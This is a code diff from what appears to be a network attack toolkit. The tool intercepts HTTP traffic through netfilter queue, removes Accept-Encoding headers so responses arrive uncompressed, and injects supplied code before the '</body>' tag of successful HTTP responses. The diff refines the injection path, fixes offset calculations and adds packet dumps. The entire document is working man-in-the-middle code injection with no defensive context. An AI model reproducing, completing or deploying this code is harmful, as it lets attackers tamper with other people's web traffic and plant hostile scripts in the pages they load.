@@ -93,32 +93,23 @@ static int RemoveEncoding(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, u
     }
 
     int matchStartIndex = PacketCraft::FindInStr(buffer, "ACCEPT-ENCODING: ");
-    if(matchStartIndex == -1)
+    if(matchStartIndex == -1) // if there is no encoding, we don't have to edit the packet
     {   
         free(buffer);
         return NO_ERROR;
     }
 
-    int matchLen = PacketCraft::FindInStr(buffer + matchStartIndex, "\r\n") + 2; // length of ACCEPT-ENCODING: <encoding>\r\n
-/*
-    std::cout << "match len: " << matchLen << std::endl;
-    std::cout << "match: ";
-    for(int i = 0; i < matchLen; ++i)
-    {
-        if((buffer + matchStartIndex)[i] == '\r')
-            std::cout << "\\r";
-        else if((buffer + matchStartIndex)[i] == '\n')
-            std::cout << "\\n";
-        else
-            std::cout << (buffer + matchStartIndex)[i];
-    }
+    int matchEndIndex = PacketCraft::FindInStr(buffer + matchStartIndex, "\r\n") + matchStartIndex + 2;
+    int matchLen = matchEndIndex - matchStartIndex;
 
-    std::cout << std::endl;
-*/
-
+    // we keep the payload size of the edited packet the same as the original so that we don't have to mangle
+    // the ack/seq nums of the following packets (not sure if this is necessary TODO: find out)
+    memset(buffer, '\0', payloadLen);
+    memcpy(buffer, payload, matchStartIndex);
+    memcpy(buffer + matchStartIndex, payload + matchEndIndex, payloadLen - matchEndIndex);
     if(ipVersion == AF_INET)
     {
-        if(nfq_tcp_mangle_ipv4(pkBuff, matchStartIndex, matchLen, "", 0) < 0)
+        if(nfq_tcp_mangle_ipv4(pkBuff, 0, payloadLen, buffer, payloadLen) < 0)
         {
             free(buffer);
             LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
@@ -143,6 +134,13 @@ static int RemoveEncoding(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, u
 static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
     CHaks::NetFilterCallbackData* callbackData)
 {
+    std::cout << "----------\npayload before editing:\n";
+    for(unsigned int i = 0; i < payloadLen; ++i)
+    {
+        std::cout << payload[i];
+    }
+    std::cout << "\n----------\n";
+
     uint32_t bufferLen = payloadLen + callbackData->codeLen + 1;
     char* buffer = (char*)malloc(bufferLen);
     memset(buffer, '\0', bufferLen);
@@ -158,7 +156,7 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     std::cout << "buffer converted to uppercase\n";
 
     int contentLengthStartIndex = PacketCraft::FindInStr(buffer, "CONTENT-LENGTH: ") + 16;
-    int contentLengthEndIndex = PacketCraft::FindInStr(buffer + contentLengthStartIndex, "\r\n");
+    int contentLengthEndIndex = PacketCraft::FindInStr(buffer + contentLengthStartIndex, "\r\n") + contentLengthStartIndex;
     int contentLenStrSize = contentLengthEndIndex - contentLengthStartIndex;
 
     std::cout << "contentLengthStartIndex: " << contentLengthStartIndex << ", contentLengthEndIndex: " << contentLengthEndIndex << "\n";
@@ -238,6 +236,13 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     memcpy(bufferPtr, payloadPtr, payloadLen - codeStartIndex);
 
     std::cout << "copied all the rest\n";
+
+    std::cout << "----------\npayload after editing:\n";
+    for(unsigned int i = 0; i < bufferLen; ++i)
+    {
+        std::cout << buffer[i];
+    }
+    std::cout << "\n----------\n";
 
     std::cout << "mangling...\n";
 
@@ -494,6 +499,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         return MNL_CB_ERROR;
     }
 
+    // TODO: we need to check that this matches with the ip the user provided in command line arguments
     uint32_t ipVersion{};
     if(ntohs(ph->hw_protocol) == ETH_P_IP)
         ipVersion = AF_INET;
@@ -618,17 +624,27 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
             std::cout << "server packet belonging to the tcp flow found\n";
             if(tcpPayloadLen > 0)
             {
-                res = PacketCraft::FindInStr((char*)tcpPayload, "</body>");
-                if(res > -1)
+                uint32_t proto = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
+                std::cout << "tcp proto: " << proto << "\n";
+                if(proto == PC_HTTP_RESPONSE)
                 {
-                    std::cout << "</body> tag found. Injecting code...\n";
-                    if(InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
+                    proto = PacketCraft::GetHTTPMethod((uint8_t*)tcpPayload);
+                    std::cout << "http method: " << proto << "\n";
+                    if(proto == PC_HTTP_SUCCESS)
                     {
-                        pktb_free(pkBuff);
-                        LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
-                        return MNL_CB_ERROR;
+                        res = PacketCraft::FindInStr((char*)tcpPayload, "</body>");
+                        if(res > -1)
+                        {
+                            std::cout << "</body> tag found. Injecting code...\n";
+                            if(InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
+                            {
+                                pktb_free(pkBuff);
+                                LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
+                                return MNL_CB_ERROR;
+                            }
+                            std::cout << "code injected\n";
+                        }
                     }
-                    std::cout << "code injected\n";
                 }
             }
         }
